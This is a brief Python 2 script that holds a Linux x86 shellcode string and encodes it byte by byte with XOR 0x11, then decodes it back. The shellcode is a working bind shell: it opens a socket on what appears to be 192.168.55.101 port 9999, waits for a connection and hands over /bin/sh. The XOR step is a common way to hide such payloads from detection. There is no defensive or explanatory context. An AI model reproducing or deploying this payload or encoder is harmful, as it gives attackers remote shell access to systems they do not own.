


shellcode = "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x66\x68\xc0\xa8\x37\x65\x66\x68\x27\x0f\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x02\xcd\x80\xb0\x66\xb3\x04\x31\xc9\x51\x52\x89\xe1\xcd\x80\x31\xc0\x50\x50\x52\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x49\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x49\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

withXORshellcode = ""
withoutXORshellcode = ""

sombytes = []

print len(shellcode)




for x in bytearray(shellcode):
    #shellcode2 += '\\x'
    y = x ^ 0x11
    sombytes.append(y)
    withoutXORshellcode += '\\x%02x' % x
    #The percentage is where the x is inserted. 02x is the formatting. Which means to insert 0 before if the only one character (that is to avoid 0x1 and instead have 0x01)
    withXORshellcode += '\\x%02x' % y
    


efter = ""

for x in bytearray(sombytes):
    y = x ^ 0x11
    efter += '\\x%02x' % y

#
#print "Before XORING (original): "
#print withoutXORshellcode
#
#
#print "\r\r"
#
#print "After XORING: "
#print withXORshellcode
#
#
#print "\r\r"
#
#print "After XORING back to ORIGINAL: "
#print efter
#
#print "\r\r"
#
#
#
#print withoutXORshellcode

#bytesarray()
#ord()
#bla.decode("hex")
# hex(0xFF ^ 0x00)
#char(x)




